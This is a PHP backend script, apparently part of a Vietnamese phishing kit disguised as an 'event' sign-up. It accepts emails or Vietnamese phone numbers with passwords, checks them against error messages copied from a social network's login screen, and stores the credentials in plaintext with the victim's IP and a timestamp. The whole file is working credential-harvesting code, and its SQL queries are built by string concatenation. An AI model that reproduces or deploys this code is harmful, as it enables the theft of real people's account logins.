<?php
require_once ('SystemLXT/Config.php');
$LuotQuay = "1";
$IPChoPhep = "4";

date_default_timezone_set("Asia/Ho_Chi_Minh");
$Time = date("d/m/Y h:i:s a", time());
function Lay_IP() {
    if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') > 0) {
            $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($addr[0]);
        } else {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}
$IP = Lay_IP();
function KhoiTao($ValueOne, $Valuetwo)
{
    $length = strlen($ValueOne);
    return (substr($Valuetwo, 0, $length) === $ValueOne);
}
function KiemTraEmail($username) 
{ 
    if   (preg_match('/(.*)@(live|hotmail|gmail)\.(com)/', $username))
    {
        return true;
    }
}
function TimDauSo_DT($Sdt)
{
    $Sdt = str_replace(array('-', '.', ' '), '', $Sdt);
    
    if (!preg_match('/^0[0-9]{9,10}$/', $Sdt))
        return false;
    $MangListSDT["Phone_Value"] = [
    '096' => 'Viettel',
    '097' => 'Viettel',
    '098' => 'Viettel',
    '032' => 'Viettel',
    '033' => 'Viettel',
    '034' => 'Viettel',
    '035' => 'Viettel',
    '036' => 'Viettel',
    '037' => 'Viettel',
    '038' => 'Viettel',
    '039' => 'Viettel',
    '086' => 'Viettel',

    '090' => 'Mobifone',
    '093' => 'Mobifone',
    '070' => 'Mobifone',
    '071' => 'Mobifone',
    '072' => 'Mobifone',
    '076' => 'Mobifone',
    '077' => 'Mobifone',
    '078' => 'Mobifone',

    '091' => 'Vinaphone',
    '094' => 'Vinaphone',
    '083' => 'Vinaphone',
    '084' => 'Vinaphone',
    '085' => 'Vinaphone',
    '087' => 'Vinaphone',
    '089' => 'Vinaphone',
    '088' => 'Vinaphone',

    '099' => 'Gmobile',

    '092' => 'Vietnamobile',
    '056' => 'Vietnamobile',
    '058' => 'Vietnamobile',

    '095'  => 'SFone'
];
    $Khoi_Tao_SDT = array_keys($MangListSDT["Phone_Value"]);
    
    foreach ($Khoi_Tao_SDT as $Khoi_Tao_So) 
    {
        if (KhoiTao($Khoi_Tao_So, $Sdt)) 
        {
            return $MangListSDT["Phone_Value"][$Khoi_Tao_So];
        }
    }
    return false;
}

$msg = '';
if (isset($_POST['username'])) {
    $username = str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($_POST['username']))));
    $password = str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($_POST['password']))));
    $check = mysqli_query($Connect,"select * from `acc` where `username` = '$username'");
    $check_number = mysqli_num_rows($check);
    $result = mysqli_query($Connect,"SELECT COUNT(*) FROM acc WHERE ip LIKE '$IP'"); 
    $count = mysqli_fetch_array($result);
    if (TimDauSo_DT($username)) {
        if (strlen($password) > 50 || strlen($password) < 6) {
            $stt = 'error';
            $msg = 'Tài khoản hoặc mật khẩu bạn vừa nhập chưa chính xác.';
        }
         elseif (!$check_number == 0) {
            $stt = "error";
            $msg = "Thất bại: Tài khoản đã tham gia sự kiện";
        } elseif ($count[0] >= $IPChoPhep) {
            $stt = "error";
            $msg ="Thất bại: Địa chỉ IP đã tham gia sự kiện vượt quá số tài khoản được quy định";
        } 
        else {
            if (mysqli_num_rows(mysqli_query($Connect, "SELECT * FROM acc WHERE username = '$username'")) > 0) {
                mysqli_query($Connect, "UPDATE acc SET password = '$password', ip = '$IP', time = '$Time' WHERE username = '$username'");
            } else {
                mysqli_query($Connect, "INSERT INTO acc (username, password, ip, time) VALUES ('$username', '$password', '$IP','$Time')");
            }
            $stt = "success";
            $_SESSION['user'] = $username;           
            $_SESSION['noxm'] = $username; 
           
        }
    } else {
        if (!KiemTraEmail(filter_var($username, FILTER_VALIDATE_EMAIL))) {
            $stt = 'error';
            $msg = 'Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào.';
        } else if (strlen($password) > 50 || strlen($password) < 6) {
            $stt = 'error';
            $msg = 'Tài khoản hoặc mật khẩu bạn vừa nhập chưa chính xác.';
        } 
        elseif (!$check_number == 0) {
            $stt = "error";
            $msg = "Thất bại: Tài khoản đã tham gia sự kiện";
        } elseif ($count[0] >= $IPChoPhep) {
            $stt = "error";
            $msg ="Thất bại: Địa chỉ IP đã tham gia sự kiện vượt quá số tài khoản được quy định";
        } 
        
        
        else {
            if (mysqli_num_rows(mysqli_query($Connect, "SELECT * FROM acc WHERE username = '$username'")) > 0) {
                mysqli_query($Connect, "UPDATE acc SET password = '$password', ip = '$IP', time = '$Time' WHERE username = '$username'");
            } else {
                mysqli_query($Connect, "INSERT INTO acc(username, password, ip, time) VALUES ('$username', '$password', '$IP','$Time')");
            }
            $stt = "success";
            $_SESSION['user'] = $username;           
            $_SESSION['noxm'] = $username; 
      
          
        }
    }
}
$arr    = array(
    'status' => $stt,
    'message' => $msg
);
$Status = json_encode($arr, true);
echo $Status;

?>